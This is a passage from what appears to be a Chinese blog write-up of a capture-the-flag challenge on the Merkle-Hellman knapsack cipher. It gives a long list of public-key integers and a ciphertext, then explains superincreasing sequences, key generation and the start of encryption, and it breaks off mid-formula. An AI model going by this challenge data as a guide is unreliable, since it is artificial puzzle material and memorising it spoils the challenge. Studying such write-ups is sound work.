369786903379138525726656153308795837735602459462586022339450775284193448222731401781776263922585195464162067796071558839964285224449810825618861833590746040, 340278944121025682287127130895904442779032685905037175757974550697636391359834223848744395717721921099830385191502659638138442968831942777594223475987682283, 47384881032176509745326368707644600112417790989804160651733955936488736938179498169891907726769445135853201984884863019275009739060130972171672988098289454, 580982841256379134270584036581465227907819061009493956681485005855277773703982066377573387367403121708374373677240606638620678726165086661154851195980133263, 151021003624455996088627028616003147210139213566596876932716080403592089007607643443533762116485538623436167874966677504936240986540582348838632146680809478, 218245605427868919100275005624503823766526215738484065810227102988169086264066356642473019431793825766576850963361805257539814266779475749319333388551725389, 33973321436765616461082517187791318756449212127779703134615407435078407688650068530733042952719724960219073933421199069659994717370479216221335121280162540, 304948930147920679204236290363752775682382535843654275832795274771947287959131921623149285492003038416257410706519562644497672809839819395484779859368748900, 598898614083398983704423041859777657149832780113274981729464063535822034277831625359368441006726329360107881304434351713091750941983740450518355838166883336, 323278228442260108720063921128617996181541109799980652879571440672607400482835481830908203307688976359117069565446487659692031702792206580124285609691594811, 366085484375891846663353768837845465650031851660822356884896029582374424537931438767384348204512655828757605165054615432613549792585928273894991810238451685, 139570014761585899264203781778285887158108394458377691402497862748924319430001268175131572990168701878426627006900287892350740265375704773439043283126732946, 225601218942198374979151467721453867213870492004845437218529013156668298128754694577270028807519037008638626620899785095260788032019340376724788141507974423, 374302577059808698193987507469246923540867448197004435353898680685511364943285536562373347301568875913863334701514563134859314362086584977261940561485186062, 34048220966218586016244123209428854379073658299981236890218514473291445570632615705101428608597187984595389461907485694957695008257992118388581267165183757, 84194231824602550039330994397421332486477729062773282066141925089003561422149593336334406982167418803576333242724382574195650256370938181539320636420533291, 126437913299894501402407149120930345568461195515752331576410687261044720511118330917320582760028717693229569974442656225753326475656673002777624403720765495, 465969976251529371231149826509372790960682762671175106250230852250105974938989441754410094714864427920155578917504779451414994762051492699200411794502087926, 506883581402243389398783527500648352921737707377237134741560723799137132742518761235120000646216727119233119432842569630805683459812442129154355170046046029, 112831506872531765302052010187839201702906098449010326726342689137181677129178095724557999013088456343297660257430433180959618082464828509719667984781433473, 56264564878797778896641192851246881969753246815692051218037106456486010460445914061443664976779630993487465344522634066673399039982511822519067345096148503, 551573562416032472581208645039030181243877769280718300043871487324163745966831340934105419906100852186348592138099856634054132325944698556875488354214630709, 488255077358202660122224089347266845878398984719199180118076311336469844326030060686186894347272949069554914543502658046010315514198923214810025779179717201, 15098242071666335091577668112288263770908989334250740050995837159575755528713571427315832530142228271922519261339103226722171283275650744276954895532450775, 78784450953789709897980696684548014977742352174891852160533012048280167011110076619194107334631746814148458002977505157534864302416771735222491037797749546, 427354181050199019928271302145601276606758504170115689830985045366090479087886256983484452000076402276622116856414534104864734894244979498519431268009064350, 580049665597825729111981236084146562315401232218367572576230833981138043139650573592415668027485009319540372883499950005355644111128349570068925127267727842, 78338699545354045105856593070730555235226061182639821992149619345286315645115367513963371999528220538879238732312625924385168455092213044185211389256233800, 379547584449922139621947687807959558601266148128556429563887497081591163238977024414498504988125915976804567677866594149448284584709236132728342585440842836, 450111156059217125782121227089262408408731148049443345498756631256334027458633384027882365487943958058434600756703065576787886324993612059899114103607868226, 97625026999328653199069727470691631631174843584886770176061470677969614488151956693450512053915043423876715118792514118586283057339240109286792388000387310, 566247693403300395747547301424817832921925721604445171550637122997569165390790317805115673392013813599509433102303377697877227551440728257756029457140742179, 549807890161444749673219283685565230322686654213884711963676102321193287269571929726113273596635786697773142354182615717597728422830507346321499892684780309, 233904251671122455104451445034901809524055662451981736708765588652178850557321444500778803353168503938115696118103013845850242430986766094715237787267043335, 358962151327384067975831385888380713897889265806445828518596324656344612863212937750762115912049827236783710187900759151207083661112501806484616171686749292, 25498647995969783582792889295249748337833844517723527636823949017145847607243505060181988409349079026010126917511946565494210656706774012839827982047612942, 208789215381677026913193594988279808902268669704742699958481188421654691908863521495933032196926853305366198161303858825442382267277756266421033561788923110, 402653451988507653871969660007226857851202252210397735273269064903190091090605634676460459224835208840018688558567180685404523101377989923730923789432985990, 175964867016919425760426726556606344638096706410393588003209215494545459390116026642363461902330314576830779696611541567192787787083349495241843949239058309, 90586908156741969093118963471118854780026429654122996246530285692410679739218517246090082863706896326737553159453219191309037991074927958057170355395052821, 520348169264554561660212074918303165655296937780301614623328614473929477561962195566014665763080845364714870753534312821385659623304586331180440729570539004, 201501714039848061893318858028324206444768934056944130767883685174345218513484678407396609161333202821262556549829210289186938766227889254380451318981081733, 354393073090826651080622645558628343930312580780342462767786557813994665643411198154597274861282026978770135717937372271947719295904990657000693613637783351, 483376330854297767200413925393386432152938703054416123323723909236247934163807750841874934551911276380337888956067448226119570470841958721634278061251905008, 328107143385209543248726616382835779549348060508802200338889188661762634513456372162672710843644545709176126090515544919935019803552706184309168114867081073, 87562123737145635405260974921958231202660548327871274920370307967034020866123427461178193295226110139034480484002360575597663482291565032243046575785472579, 542767184755051504914452570538480632730536790311942708412964848806883120112868257654170280712328058472208177465917068075187098863226414137747047501636053360, 492602912953825210865783877195125154541463697072413093846765455940063422893734138802108524313792072568947840390820953489596772737447969545005551742422145357, 21992973941153860226287015675875812836869174202579177399037244867139304968799457042616926803407286604072218748985162731811236910990455733424135319552369617, 434753631710911306908057917461979410328377644814197092695091872810806230303035121829429307861751509727680156471684354722455920740169441354197925075022428792, 585755699301967669838437785021359214054135886195682886115610345679203139096649717383053432492483172619062041561522189957689683963093600973084089729765437126, 470720180119522628274059358554923079120561874268300676770594812238383462430716934372191660472952767439054934709424283455173284836143035828240273463240124527, 436316358860353620387723358170891436124309476446614479878845987060494525075862344026694385368438228907945269407523091050200786213229956312028886816770341031, 247616171627450088615612909421234657398581284691507138080821504731255557591071929336138421428595767090766667677012403584474281026171871273483575320700002422, 554110469629113828561459035309196443613786524604013681186384497469180333678428631663919742578729159186673909768677935006633280626358811005039714068138773305, 590102255659359164867091681903615252653577018563351972787453070152336918960953166308768020944303596595737922431412105099717039087474771300872891602182992432, 198809036697306983673229803388106874830752011142102317858191240531321200476682046028708868437654948633880388094380522120058052717718347453216958543661846548, 614867489167737799504685822947320498205057881881084793135823661740798776222433865749247481811684300742376528043872022941573281400649035485161588593346791852, 603610692789626857068276682577789547052399315090148020424165310612029867288702187958781622452540141989210224199160438920581339716521601352915912094766458059, 533848654727972192880850260003473919308899002607289124917830500539630840863548514372791130575300403650509135579150439076080509749088873136428467624292200054, 157810302627436713556471902420625049274348586555970114801355485080978648233618180919226850548471262183478502668923857558215391569446126215697127142557281515, 60030659033636101562514397560626266610931659424905623011938393646100009933248204380292718877422915636082906228088673243629302860458746646815725901905867747, 257211606348159700720339890972799097752768674922799248232024456848576583384008214667737672498799155464697698899257775996778624129701733139241889452126631038, 18449021612186905808595957800393127980803223234013638264438430132652231647641996251531655866671794180220763877502294041802292645059515450163706698523077672, 268919778892235521942459176637133055608077492256155260651803520465449633353669248151753820663227247723767238942827319903912266423005501737923009204107131697, 98665257814115881283147218769780657260068944080399427622547242688245243155173156766927177207354869914683122797314593231669104030924821907370543594194278370, 191870417300843331658605539644297182030870888227716710449370361645451892112938944756604164388153204295489958680650439587329075717138203926054109527404804661, 311419024517184455366082662817116819537427582668577602580444121372694439727783453653026207540262208021366720946133718947766697740743653223298493256396708966, 77088351423504059628952927976104362307258831980589548567251166541773926714247749432398812053336079350797343210805089693401183991171041866586596581240618870, 105730897292335220148004150005473169181234929185554062244251282002275223144510624110377482868227894369027124274710901581478510618132264093137690322982064215, 17872203464582103950106720589684582512981012656368312745364796977436722280482466273448256894844065738635805120615140776315368202533384363712660692795724140, 489422784348001825673472311433115664582380231403582300274575143571226189755826234866316424888992309150442264468166080136342603896061849610177150839519592630, 170551836074928737264446513282791952271789419043458830725606115432115690460892614513912760323046237317973707582817666653872902745836328943181224925417182562, 132318057843379132183381325765716808685727825010840651317040985119925776165512156117201261579612826922462539401081566644153160141882245190503733307151119952, 544994533591946987585747723839432159893067090991165378757423098834894152257326564602066880492748130985623755099929124743094655325565366115773754635813514906, 197307208736780317990542112450663682341631338044433240061552441358856174171962734312779181632586574912491795183498460456183886862922411616671324684333148662, 512019186678746145980396028875474072206958894189767836632643091871343706360595576575360240124189875582270902606279008873884014172211790587584538894327506266, 41008260369554712363470132719575901159953831033493963834374109741906210391553634452063999254970872541033643513166584168724636441254416713661050970146563465, 288648541420058562486145212987560479176385673364462680572070158090939855167345918791944289839094010374422012094197998966242878488054386505830583190830435262, 438795736646530312767227445830718466925673847594348557019383147559789230773357238580159140586872530658671392178456326995886613392550447065554951020373466250, 227614551910199920609765797179008449371476572229603502451766179580938379852556458112077278501152822481759922199989381349202963004822797067985089861216312247, 610528494532146741884356298489263038325032873274217303692483727471950423556822402748518246517451240843228261554683335032219201069262320657691151436638082871, 401836272495697336953809607296578158426965922910827784569073449592223658962932586401328803861799066472744747460874685280446117611155938713312366089330547838, 192746946198121048119110092709363468534289914152688167474023881921488915126583175420021793831808020865689336691055665588082121521805768204950411417211624460, 149081114026537312696105441651058028238810334750903810490941646772859050872220802216040592720871929405169094859363855367905567370883042735507090763428167511, 437777546780939541774077587656330781243150477875985179988138442488069007470767777987183976997000409233547870721973136494259159735335584809852714891556112865, 158357362221359482961972288271670112261162454842298198379022472514724757865766798335714197025485403861749062207143684089583024827975381457820873145127193016, 420953580119286377286010366758431651175444002765611848935141632252891554540600674926620481140739590383609823958309117888148001690512339173563480272999961545, 405437019822473855344067858462439426687781522181348798986982187706388543184852279704956421536163592418960950485564760536110995644449996312898657948497940616, 218250880124314241753087089995871477860380483044446898557477492659591176887840904770854695853141713855243233184827571900007040252964635990335965343808640720, 485251652896419712773053686329900727015656148000065999448782293005745106754598745080589312281963649774035936187786927244519782802097409992494270814502120228, 192669105483896829896412414370517151226520451186406522736162526337955356864432242485749296334801206532142657302597805229813436179646896088336652555928752002, 515524617123249684483048800525917075690219140112304495426380576138464303325211157771517619038961481202580654852675188167541370074892233351288221673906396623, 327366903438973063179815457961149771654747388318185008998265766937512758922733074793389896163309715983689704486960398217316690456180243294472647411384220304, 495939514439860675862659327002967368864258786940195982203407708871993930927198466331818956294170488601878808607276081193983946798552754048262265657094822959, 316636554423443044421695011555180549831983473034069776006699331499809457269776762594455359761013258316596018705682928508655225305900779723355763492720073686, 361511259122881827009007196225120107934975341815458954065751526192169546436868100152880756732231048279423670417054643905527823918755318060643316256348500236, 237808167721685731743666988686773393907480136754193865053002908572689490075775754922029728479096366533995180350456955132194424721418708506670161646899526214, 302571344355868474032637061485452597087033341839014378884506581459080048492135053912043810274237278212512481963966999305470667917651048048753769115670796273, 539225004825911014710802471825423015038267989886592655821089661308670565266814533122237541666628963239926837412489692072300860209359830336702320409860194620, 80322246769731822319875641137718270613004672267489551587458425933015762892838937992156485046360581013208965510924271575629047002668052046321698321395665847, 407905642850897688568410606755704306378622411801588505613744926646151445031561871518931517115186427833704505366734130470662590969473196555574749070394295075, 582593493721202450832609592406387621703371030044251878352689875028404224361137142961039499547056002467418975004768724367212894609714895414881659435434888382, 406686034943698211939320843731240278525156658610148640979217067897765137519089944677877220915721679378628187446970311220083751418930197067129897162929879139, 147577811618678727093699739005675984188093577788056114494168756219210464632915546894596798228953150219655381238353004936101642105061166947138574298091985167, 244040318009534892234329829458414159895496091014413577234183902554627423452233132178371220129182424186782416776216278638453358903061821320988748570191412773, 139360396071879071679724427132804103561927151350775096055566373226149530775534046534108277981974845311632451526601347752392692407161189152493399092497753664, 284361493176968596385254999799147141910625912225998148149850839943884956433805517914402124989786807349232024647590745994677790605710768698265579096259526152, 366197727275880435950745916488273913597146674508285149836083757495440369418145285320941448220263980744716752102395682567625247149168596940206553925980728330, 422254466064316104643423205614737085261229080957463505541859958450022329655964646407653584045660022599424702917924337288720650978914947820127737648892835450, 49403668378011099962186656633709540665147600567223896654861254704385215549350870173405133654895785091498994144695675318396292028609456128848397530541606030, 139809008374366977754772511487972684678451948315958678206533906107250809073910292736461039987641749902659516891786177790404158840364977383081408023436645965, 521501888556574066491760747665048621840638980783725623277929775164130195690130512859861276922234001335010033740192435750978419722362625246275422707776061855, 561957387746562908992171597134088784700271286345571370215994787946707758458984061774140461067198642150581273705963064115457108076338988212461898352716650542, 463955355314762971958704741524935151237141155468382380178984938221980444852786256481788588749318332930249361588475117631712372286939563243392102401667610157, 297682434795281626173654579303461625662797901761204034810735062215005881537385866547357553542034413901438985620510587187846145248534858233897387779208886896, 613779496331296492820464921371032350686196825928358116740540500878813910070637213553063401794278058313721888944570187643950733721847761018346786223846260819, 351134285153706201016326045832091989058541253147517266910361146928719592423296531385573475130070205100326872606790490306925617703143619077237257962640875458, 109858190971831628449730761079593596914989405264961941668061641948811355145617145062994940361966470852888431588352445190726407229472351421915655775010815178, 387432627150122431854813766757947603872861355736134176542255691485670282913121395157248372297526925413210420930852910948784104256868940125774002840184809996, 138324121665728441736619681402808980600065608832763883686183569307390729589267940463559994197456899334118809421521975928392119702615074558255136607085779728, 387621026414796359977394215070771516511270669387878185984758959537508545537209823200342888274399156160507221446755188914407296888054365099981674045036502053, 595047254179332902517892421013638482120939739553572769898601311115185757344408717037356566480055152125182314856493774288290211383481363883588070508637877729, 231726259552249122186290741142571330944610257183552995273359694322262945694901150100521095377438288979331176841857660225665290610113578800043457482908766270, 6014577468336832924246179884748312095698249011941851807683714902989065382168718896842098646840344044265000463058268376228230485493358525483861683081281169, 335939423092992544217818746003882405500391275605373962211245271990577721944612434454141296418350686199886161872711415342702285671039355762968696366991995627, 189357507059040995660667967311052572009132589158888341861473573527604550716958987561222000220840459662294423517455611106440949699271757760705425184722330017, 147956446690856791533399201923823016003867752795524293867231656773944155149152164719733630930991656382517664456593493018234492586949278572150097726850167203, 66065741548210375911973499673197000303255811672920709908243279332408190036301699896722642968083869004876904061501799837695312681101184210476229075350529459, 545577965595331403102030208658045677499451404147027114349009383543178894017175871855444892971357317198536330907218300517447261466819718199453537679675412478, 560999890043718197795477280781161748749440999767139072760846807753366909539164261638126435931754943236972679973105405308415826312600524088881915028942970487, 394609435487783182698654275332518575520592391784843091554775669743128274733903855551797849105026993643562788927530326649831666619941760202499682586929220220, 609949810268714921505705099039934396537474886676219173422283617216996130204722868052957228605994495177153948986702825456021266252047515078598887073482499983, 527081776876287292860222295430017356892247431699031853813011144173648904294324270414784742949154266922962058113358690298755465302481287450916461282402326465, 317000031152511129378100635943250410235256830827267330797365953915598038681544747744945937673339112880702833151730417289799504021158998267126097107786257755, 301464625391817390203524693694409942867307123253338975065670792929144649503419480226863238092056414601738188022093849472003808437154826626144068855366017867, 426361274143546490059278037562560012702732744860858782304538603383466466864086980321597386433478340511561705882292900266170760823479349289401652395080551735, 210010985247667274472304468321630013122711035092132807387660086026755791895866224737872131962023406453119025553741602238690882876837798741549759681992560599, 393950716444670567332344322898309168339950896396461090195465228208772733048927752798195742572179631075584073883125712394344239234199171875784256887857476812, 130814939999561438842216623967560102299300706179414570437642630348990099876381195637106899397577104330631600839156032767474121997773125923484007625226715252, 279921672240614181163288380433125326992890082190902298743090054421584419055698458485375953932516091663468557375418205527774177812678253069939095289083278710, 161293438560931305928591007866598206472158158444643128635190304553013875708533261794522416792417059660175781422289511879139119783498614733998790034526623432, 232006518889823987284052893120310913668276274040218344518566329799452329514201219390250939503302683080230684500129261583546015939053711093777177162238155054, 247524401458857756272122726667927654879310981530406569779075639645568437355162177278486754130771608033452929138042727413668538783187362008984015905271992328, 123975429842848420134257963781801556804543708809828003972363442798636322960670669334369948720153951124347496653803402221050539862413384577024852851884660365, 303491675740597062418273146410652460556869594007303046254575721910930748582092944478952355222152020781685974457052486098142888342138541347342624910753172098, 391858661806833978460762659174859000129639950785757976963671421658661090544402246259062632652610245408275242808074084828919469216706276540084322680991624027, 545899491943331948297002978889783533969056970445210680234640720774709723991913004300661937335319724900033359075480509760262347396126727518350459821776400868, 610118155193335708824707432866199098799940486196430931139865001834452790548133981835689475790036377711862456690955320554805733874062378980935067322397486069, 430499876420509591800690043279054276455418335358927323881750923423309956012268463764838809212166722775243309560233638591282449988068349493416493040837428526, 414126611957026510341700697416043036162960684959146598323385272219514374260629568319683385979442237971922690766190842961812235523557989412556587520114821504, 221762996722236337707667546116321271788714507133147103746873645525171589091402571127832377134338058189760397254188844590807790818910870055985079996178588406, 200680041982045288490632459252829476007814491955646457918608720853345144069644007866981689825705835832176551778885871280623494270992827771091639980783441023, 347762786740234156312482131744472831396370333147041833744676774470888561610455288633545684787543103151187631871391852137315707413478003715596578766818454613, 437009970733569752616677833504834660695807624004990657042630121743945437624103302527287404047618635742248584185197597611431626221927432920527563173319267946, 153536753547665784269552015677288782325286830362047153575828849274164362270631925695874598170429788024938830916343817980726186952710554369338922221092387093, 158812051840217635345337769072965664545536301818836643843078651987828666463456195610764354230432755606029555401312350424360060738654500594370293379180984551, 606269371808080324000385618055310949352139461897387721729651952087956510860386115251654842051266419874322262606498397334128063916887589989699622715537820199, 86510652130823749918755577230633070257519444435729448365710432354264506030633588743315855199974302846540197329765852416504975671363177534731271499415734987, 529538130470546754675086640976485216045633715979486972078208401825410340147603792940683339761009094402473956746631582132964629153063501188363182103503836215, 65309885571888621924044109422181747317812511674977392625727074516689632476670021953970507032528884248216798503600218305184012135671763228829928843396451040, 214293037845161750911083059138383366337716267169306161885318020203744816514786394841866728627371459298547350425917243821355625928392164337575783206474509155, 159843944195520959951977229219891818305043623186837805655872227078646807118795349998396722947704616285909829656539814877913822984658362603711961215801251541, 358450382033881322912625454696366411429559178073772796273532527192206386460556937343918955788723134700049129340106155325927929654430582791439332732233132183, 572789769394361277817567646182349623025106731589841166340598668705427069855948600329837585584597904079196745736427141877136041054575959680302874295827485134, 568331180141441599447152057647110069203893472141113984206122442733664025995820185123143005266845686203489854578137493228908395051790178240408092377253812825, 598833287970880678254006269682543327948065308914915015076127962375321313069903062527974980072804841366137331485777050119358607222811031070747950040926630213, 461689128492113134993481039023650443971869643837936469311699890634981877483344869242475919229713419678251819518376503006992304500259259820072674501783980996, 542069022390263860884705312258829445792036313512834994386870713855938197408315690927929413307512463696099391629150103942025227322813359926185722833713681845, 373030930588346383178123855680407995404982789773663210646909635443322935757324123896769368581011559494330185308815664409515348954552775607699241068081349499, 302734759514085096862201670717101245565998071397306964201617152675933515175522580292696046741897882638937128659473543065399529190076150816272603939013945898, 314357346902912554765325827123641804374725163904138652881012658927654979897917859734726194374129600080757503428026989249002320089521315111248004962289121842, 402638966309036197431611386615773789778894094733617566907836716134747938721007884922966223338900425266699399029507153018302782400163525657859748409275408589, 228011655734228804240899653231782859980328550276347725802909743963059933797831931031250561704471231155114491574359618457468240963322510217433894326742489036, 550195678908793070295757085593386229777727466791986365910588894073249850656531300152920034896539595768672947035503008132327404554977691438003318831391562465, 538435992444333013423661468119530895281114848888368932782268740862074816064173723152925818303968926152190083205486892768289769770867000639912352051423505736, 520369169163506861473747394037050386504114192893600767489673134694150223349051878274868853008570139078342054661274669317782048421555700430016374586361591752, 106775211999932339398437592558088121653817576411630399132170830650291600124591023380291663261011036349376734368844235618960462546628249162702446777797889916, 351606545816842149424067364463124236663210071541350943568809515324432620535469009159775856910031712473874480464426620805242501104696026514843052427525216773, 286998365231532898362252996540598911386642095527803096982556962156532032552151160934955276129937543713472480483067307093889895089999877936757712137436941089, 427103626623818118001747641082692167468741869544767730329384188919691994794377951527038357958164983855317236150698913042995838365330529907219855591239146443, 526688864448485313309966345127615829348905851226670347992002227094599966606620074142223919101653027385795881527642918556086167447755086018846796819708709404, 534468472700532695389901720055971740846426779150870338948195829271610424424419007500753020003911268479246700182020780862202345962232691341220342469895912868, 68315077272532647340076658186634389691824204878493066076112573580110616870743986184623183998740160678467561807583173305644329620636519547723594775796872189, 243307116673068615779685989169827813354755618536283149968750094443576240021408971293354888170473377358273415677314922392076596361852137420094984120751989733, 613617663932581828320478745636552013543701653779570837747854193950462976000101090620155298795406582820160846696906461385268208474228608678432474699924024797, 473364399491521014432679805594484959286887601388754333040812779746776033871324331879944622679135572792055946069671550429980302268776363153032879293789925820, 82308809404143167166285070066842770026512607696178218382135426822444112281697087811310223621183492147928273283971701284841794315636383689407103008123926507, 100582830696236316322821140867198207456057356073225962976637707283377573495006299164242671771433389839346248477026182453739559942577600413741626134252718372, 598952071728065114532026697899926686362885222210611841260750797286717813700854807390369692087330946157088777980655866746692567475867961401922212689989364290, 458224826398931746956486731979144891191862745683588761345335332591409812229798341770037199081229467657185810003236503494222025704432259330138900388196692973, 604658667647441040306999092427983579367645212260937958928981677877158281353885468916873508912251496773113880468040034479238887275474228069600643053842266247, 589274513499909384773368093832228988983044914891972535328330227609365988704843761617884577126572545706609919979345033547095695756831829989308261183680287824, 480107974433295435918296993572228788880814900834815743486863844513523211967047644274028450519778787604582571766924431501844887116511673242675176889007731975, 467933038879244536314085304221284492863838960604706117813113375216509702174270339707048532275632982470996761086195414236701167684709674711784456163129675251, 203732081902062250419357653332698140265907271040316040709966198908425179912783242291994162735731822245343364919316385103110560537853196036023641914833384003, 185173008988701739953479660818627477398110504953139092604318027343975442946557120882911581446931849221138593511980740228397393411279293947858174326855230008, 131675684582408854774126622723833367625427349994611745201263634937280036907235900136470292246232988938926103650313250188643470064577662810424236037828468030, 626312550518287991409109152629401654519618321627967331355611731629393882930243474741044871114770300511036435377064912135039550432791759558162854816025150817, 33596067041408658440933039033617722616499636838127322197980186098855644497413967766468050897209974915178357390703855843790787546784070318174541745311908762, 202526727832858822628355112140675608363630719455118971238102853678517866023583398314875311666630233555093867657141764943188753793412584523459457117408074390, 410548485687038079422099859630626361582999593205877078030086272993123160754748028808895186451066045543606328003926218659145406047828750672547237246766439824, 410142889913206074121772456972790966288735256192461128087806343066325456307458477946618883076843261520428566872924311982379028977573960784851820878549225195, 122278171362415308190076492062948326089737082327203194704915656508591403352606905472675759959880443892298331625472258127022890899826785640411453371204905319, 43778820174063973541517825268888191955779405075734642119990468792005591770351951213170059547429465014439047925187374702817308320307273129220584523232449147, 24620179526737023203674142050689613728991600185375969621208019999295004085232797296956517319588072331078855555075309738049218949051196876979317298474905212, 234593496436502692967268373701297367552974575213848479393604876713420748016011627673823390536879807360677070945164394180579884251128692158705248113335492933, 424466833249547335522938676285054266262136918844917069450311088555084423708456171454924014753110790307657857201445819034873575164207559810285057193334059934, 423893831716679434002698923752818050143225906215077897138014711247023574325253154794639743874529512829509367480021708181355839841707188947863501261529043406, 49621165884870081796238397159533096402390218648679874091959366344767294327958350819892623519426990617256824573452131857331943006517636555082736491751548394, 425785909183773163298870612833803832468171606274953895752893575111672285861808362598468861783378379111604687231209695436977207806612377987152593644974555702, 247700936110514316335816500028814943312349987125826422118250614170475753541454094917134906574472854100155895752284403383896458677357319032713453672702292852, 476176280401643939970713853717897788034207329678421825980918701953388963862318569570078196850469094156410395947755865641120056557096805545600611596062859850, 595942799759982434310815386253833104959264723037570720903753266205708698125322827492888593378853691048368082698689429341066979065291441031269035774787848194, 227335008403577815289004908844714752164941474868686795337360380834818389976603858881217743361436116280906889722342142194970410104530611089268201064006727240, 294475171902199543911673842878170856422541801071007579638660080843952787414133410258836596502706744292767065774104927469961134943621487620494600725185335093, 504657830357261550204123384155279932048388394840751585890069904780121878210168597836947569575612627542383912252544122238680889255842911235864535595804442473, 123618893886256680689492972414536855343009874728984214723371187372371559017400340205649436646724764351420700274890928048314735629560293604839112507976542658, 144233521727704386549303320253825018163529386246443158431598082626369370733206344547862984626454145556658554966362472721680582681917585752685291981975051399, 468700287792297434144725073756610319600730803831672380833981751096192777305193276174823845298767404216573861229823548943962038747140832005801894641148194438, 360021194137471632311945269649453888628074192715124921464539045966384883189546688254652272008683590729394863380942342038275263781559238107896987125599602483, 9794460235465554331159958985600948940043239277811962612206542035810111157574794598799541419127920504345906815087573174477732510996620908014911532274336593, 496184287815812758880746208172269690775808466764413116878426077565414251613486369473260889935546618958391520838394054317302933313497769946297998283660535006, 375034096466177534772620301216645581475068062942309762061356801765914158724497711056946102460258475536255941444296262906800165900520143547314029294178918984, 83578918945090748538767703538385463417799162341741990755007914664207967790581609681198852136886502755147333033312467099719582625381145023996792645071127660, 481785162081270700829721546755154278038286168971257199103177897012399245231770921902616431352370606828602207651506642251825314265331339736043767348294713962, 464934814020762462589403725304178866133776592320115003139549110183309337156487696532687296784797283377213307028847125445142821602683207175993762479145705352, 421079825557712831650848423859531934111152831350534941756065225121212805595293259723574964575039096598502242500155474608857062348638608930406544118200487634, 198362189120777947420663951717805171921258682196924252426868216823117260232048827747288482245273102034752373979580424106596979249257835908872141268918847381, 611601960322638911046114789002817661499768566193108792817068180733729758360979556558011622774584672041208575102964169070371049291564904087732613054221105489, 283628564080950885802996568067146552580775832530112587609483224303778863025145712572172242292581751337284664197677041792418452388453743309919973170635326844, 80457652729048973903631493155303826820654071085298756175722755047019139331082781168798358271919763838526600601990470778438399350721345036601645043500986895, 588639052877508689856623690107590138174179437544872612493236582778422297366871329910635454584209702639590949187356449452872585476553096543358587366475156095, 392575044459082979934009523951801274526432846128777691072936032351249246903166956223331948226034267423493197695176748297468919865725970605667254045109876567, 341163061579084206668850901304745901467746838532908448713712445405218993397577275473785148743700048718996537676901711738778405413554253743271580828506448444, 146663815305537228531799210158963007023004667558955323042825692657228237712755205308257844612752246229325315985931546082014940127509566589836683507866784150, 266948848258687056791818173826484625801849102578999054424930370456298648095033027455168231137419084160714847286062742860736067108970832705279884811220152935, 315508383040249165814570813092408413184381762105090072013429328102585152485002531868016303230226317334004314956086141331754760573331067478198388598446514425, 83451922358124750139482600250084948033787419546090325585288220900401464399275717912860142666054861177194901801757731134409000052116995015890423746604379174, 452113485787509842228792995430357771044000187298910774099695116582871098496247327065265684560077675970391826303895310629093368390395840582013678672298979840, 192977862386482567944900344305517878622765301051326952847631818120406032629045009393125063590720102116725171513368406596671686886095167302082799405545350857, 101511339824531515096841442225762534293321955819909141327856237163896065492413547345387945924342153474508984013570132802982212493801830236574520199716499730, 547673185500805365725031923436630873456479751927865520531662177599296568464508670028502029591842499345554999026386621984814058927566414770926091560033272036, 340650340843257279112322912833691923237761934048053648009089222160802547085726370770416709358346196086893211986054397315682859143987863729415228652266617319, 139546569949460533058609275431776648368698491594909649691401799444304372809416319013258630173419437277066097498953741908734593683643739711393124504167970215, 513123526210939277904939608381937011410399149246897334122058292964031048048175513580615352168881288692099261375159235365563107612409044985151817489122806992, 394307146044339924045401943041229168461398644121027856494844415337017334590509825271228289320333593536968774116670366206376632880058229583437878108577981182, 591350499718341851936166378255483883048497019757533989721798640205000620344402654533044801275905441432117572130641601885340089672881374156251060611108960414, 150850471030525115108734155218069314737992840210007568919487051028283574550258561733521903549685129897958404289999323611328332588478840696968210386778996203, 252381207475431806958715313480618841717428865129403250447789748740768022910308129091024619630958725699604414443737661749176271839418198710379052142954396830, 84400426281854691326046367781077405020239344846199494441477106021975322588492173948665838744136818610606771123385233310784005922099283528089635768304468681, 503146379407812755888443355950444585606874927606579215796146138930590813825448770171016158475464676580511833797434983190183126681565414159147130597622762136, 493111949340975765259270510466721887847738801196465645622873205284536473026214669999271475821678192776023856031145994111689699665581640472076878622122649217, 191794793043773164702155682177498429599159111908706153951075739575397569857714068123675631826457528810352447996109742404124369517503181292003507140618942203, 43967405340505785755215500851115774842113895936176349411512492343532678142115321057746078783263385489709276711277658252583017166404397429867292593143024815, 611734105695501338960555656516658373960757754253788829708349626517949396385295404497372853961670175895111816970174158947477023059191034910518663780903394284, 406807934483556676723848810472365429475802391637561671753299275156092362922562218291691250861041170704995818473908752617511899436637764778963834368323523326, 375150230426277542414263215741289314302516374886199648525693131986368214566854305254092405837471110546003889594464011043528163414472162438667734983369538615, 11934461814798569950870935990237050258738699627589361089092849425430554134477388475667064467532484135260717931093708490041408361310613155317724545391530776, 230000185910271819756066696377658476258538655823231452421112407369239768355553770966392735969807833354077948868925072659916015401601877408469037133208414362, 244136033441996435421452231131096157385711275845341378513207352363855811731627371352561773916358568648372264443643548672120748647700085220185452979838664473, 216459789562675536216621324907190534466023009293344921900061310001201300139096572143170781862031937656324089264736243855139420216658761202805038553301166668, 211410092268353227246688523210304774919220280352353832507851217644889855008385930377486484758101990751918970991217582515805263988102283713019530332069699430, 571866349580096478514185650108166756581124529265967898988395999307548344516104406299266602251669087062292521819544525317114339561550297079795354629133284404, 449381055269987650629233558856165179182103716895738169021267665746916341545033300548646095266227981755812511151866481116883662111957964316587156376579046385]</span><br><span class="hljs-string">enc= 447656773759696377167031447283254705301534680469710769705934769573534603248930265716543117496622313565927565321549718858513806325078848873919486040210172673</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>参考：<a href="https://blog.csdn.net/m0_62506844/article/details/125795366">https://blog.csdn.net/m0_62506844/article/details/125795366</a> 给出了背包密码的思想以及加密解密的流程方法</p><p>背包密码的<strong>私钥</strong>由3部分构成<code>(bp,A,n)</code> 其中bp为超递增序列，gcd(A,n)==1</p><p>背包密码体系的关键就是给的物品是超递增序列（<strong>超递增序列：</strong> 即后一项大于前所有项的和），如果从大的开始放，只要容量够就能放进去；不然任意一组序列的话结果复杂度为2^n，难以解密。</p><p>例如，有超递增序列:</p><script type="math/tex; mode=display">[2,5,8,22,56,99]</script><p>假设背包容量为80</p><p>99&gt;80,不能放入</p><p>56&lt;80,能放入</p><p>22&lt;24,能放入</p><p>8&gt;2,不能放入</p><p>5&gt;2,不能放入</p><p>2=2,能放入</p><p>A和n的作用就是对bp的序列做同一个线性变换生成<strong>公钥</strong>w序列</p><script type="math/tex; mode=display">w[i]=(A*dp[i])\%n</script><p><strong>加密过程</strong>：将待加密的字符串转化成2进制(b序列)，与公钥序列对应相乘再相加，就像放物品的过程</p><script type="math/tex; 